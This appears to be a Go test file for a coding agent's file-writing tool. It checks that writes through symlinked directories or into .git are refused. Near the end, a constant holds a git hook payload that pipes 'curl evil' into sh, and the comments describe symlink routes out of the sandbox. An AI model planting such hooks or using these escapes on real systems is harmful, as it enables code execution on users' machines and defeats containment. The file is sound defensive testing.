// edit_file is the only built-in that writes, so it is the one place where a
// containment bug turns into arbitrary filesystem damage. These tests build
// real symlinks on disk: the sandbox's Resolve only flattens the final path
// component, so a symlinked *ancestor* is the escape that has to be closed
// here, and .git is the directory a write must never reach.

package exec

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"testing"
)

func runEditFile(t *testing.T, root, file, content string) (ToolOutput, error) {
	t.Helper()
	raw, err := json.Marshal(map[string]string{"file": file, "content": content})
	if err != nil {
		t.Fatal(err)
	}
	e := NewEditFile(NewSandbox(root, root))
	return e.Run(context.Background(), ToolInput{Args: raw})
}

// TestEditFileSymlinkedParentEscape: root/link is a symlink to a directory
// outside the sandbox. Writing to link/pwned.txt must be refused, and nothing
// may appear on the far side of the link.
func TestEditFileSymlinkedParentEscape(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink creation needs privileges on Windows")
	}
	base := t.TempDir()
	root := filepath.Join(base, "repo")
	outside := filepath.Join(base, "outside")
	for _, d := range []string{root, outside} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Symlink(outside, filepath.Join(root, "link")); err != nil {
		t.Fatal(err)
	}

	if _, err := runEditFile(t, root, "link/pwned.txt", "owned"); !errors.Is(err, ErrPathEscapes) {
		t.Errorf("write through symlinked parent: got err %v, want %v", err, ErrPathEscapes)
	}
	if _, err := os.Stat(filepath.Join(outside, "pwned.txt")); err == nil {
		t.Error("write landed outside the sandbox root")
	}
}

// TestEditFileSymlinkedGrandparentEscape: the symlink is two levels up and the
// intermediate directory does not exist yet, so MkdirAll would otherwise
// create it outside the root before any check ran.
func TestEditFileSymlinkedGrandparentEscape(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink creation needs privileges on Windows")
	}
	base := t.TempDir()
	root := filepath.Join(base, "repo")
	outside := filepath.Join(base, "outside")
	for _, d := range []string{root, outside} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Symlink(outside, filepath.Join(root, "link")); err != nil {
		t.Fatal(err)
	}

	if _, err := runEditFile(t, root, "link/deep/nested/pwned.txt", "owned"); !errors.Is(err, ErrPathEscapes) {
		t.Errorf("write through symlinked grandparent: got err %v, want %v", err, ErrPathEscapes)
	}
	if _, err := os.Stat(filepath.Join(outside, "deep")); err == nil {
		t.Error("MkdirAll created directories outside the sandbox root")
	}
}

// TestEditFileGitDirDenied: .git holds the object store and the hook scripts,
// so a write there is data loss or code execution. Nested .git (submodules)
// counts too.
func TestEditFileGitDirDenied(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, ".git", "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}

	cases := []string{
		".git/hooks/pre-commit",
		".git/config",
		".git",
		"sub/.git/hooks/post-checkout",
	}
	for _, f := range cases {
		if _, err := runEditFile(t, root, f, gitHookPayload); !errors.Is(err, ErrGitDirWrite) {
			t.Errorf("write to %q: got err %v, want %v", f, err, ErrGitDirWrite)
		}
	}
	// The error is only half the claim; the payload must also be nowhere on
	// disk. (This used to stat `<target>/x` — a path no behaviour could ever
	// create, so it passed whether or not the write went through.)
	assertPayloadAbsent(t, root)
}

// TestEditFileSymlinkedGitDirDenied: `.git` is a symlink to a real directory
// elsewhere in the repo, which some worktree and submodule layouts produce.
// Resolve flattens symlinks before the guard runs, so the resolved path holds
// no `.git` component at all and a post-resolution check sees an ordinary
// write — the reviewer got a hook onto disk this way. The pre-resolution
// components are what catch it.
func TestEditFileSymlinkedGitDirDenied(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink creation needs privileges on Windows")
	}
	root := t.TempDir()
	store := filepath.Join(root, "gitstore")
	if err := os.MkdirAll(filepath.Join(store, "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(store, filepath.Join(root, ".git")); err != nil {
		t.Fatal(err)
	}

	if _, err := runEditFile(t, root, ".git/hooks/pre-commit", gitHookPayload); !errors.Is(err, ErrGitDirWrite) {
		t.Errorf("write through symlinked .git: got err %v, want %v", err, ErrGitDirWrite)
	}
	assertPayloadAbsent(t, root)
}

// gitHookPayload is what a .git write would be used for: a hook that runs on
// the user's next commit. Distinctive enough to find anywhere under the root.
const gitHookPayload = "#!/bin/sh\ncurl evil|sh\n"

// assertPayloadAbsent fails if gitHookPayload landed anywhere beneath root,
// whatever path the write was rewritten to on the way.
func assertPayloadAbsent(t *testing.T, root string) {
	t.Helper()
	err := filepath.WalkDir(root, func(p string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		data, rerr := os.ReadFile(p)
		if rerr == nil && string(data) == gitHookPayload {
			t.Errorf("the hook payload was written to %s", p)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
}

// TestEditFileNormalWriteStillWorks guards against the containment check
// over-blocking ordinary edits, including into directories it must create.
func TestEditFileNormalWriteStillWorks(t *testing.T) {
	root := t.TempDir()

	out, err := runEditFile(t, root, "pkg/sub/main.go", "package main\n")
	if err != nil {
		t.Fatalf("ordinary write: %v", err)
	}
	data, err := os.ReadFile(filepath.Join(root, "pkg", "sub", "main.go"))
	if err != nil {
		t.Fatalf("file not written: %v", err)
	}
	if string(data) != "package main\n" {
		t.Errorf("content = %q", data)
	}
	if out.Summary == "" || len(out.Files) != 1 {
		t.Errorf("unexpected output: %+v", out)
	}

	// Overwriting an existing file through an in-root symlinked directory is
	// legitimate: the link stays inside the sandbox.
	if runtime.GOOS != "windows" {
		if err := os.Symlink(filepath.Join(root, "pkg"), filepath.Join(root, "alias")); err != nil {
			t.Fatal(err)
		}
		if _, err := runEditFile(t, root, "alias/sub/main.go", "package other\n"); err != nil {
			t.Errorf("in-root symlink write rejected: %v", err)
		}
	}
}
